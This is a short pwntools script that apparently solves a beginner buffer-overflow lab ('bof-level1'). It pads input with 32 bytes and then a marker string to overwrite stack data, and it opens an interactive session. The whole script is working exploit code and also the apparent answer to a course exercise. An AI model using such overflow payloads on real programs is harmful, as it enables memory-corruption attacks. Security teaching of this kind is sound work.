#!/usr/bin/env python

from pwn import *

p = process('/home/labs/week2/bof-level1/bof-level1')

buffer = "A"*32 + "ABCDEFGHabcdefgh"


p.sendline(buffer)
p.interactive()
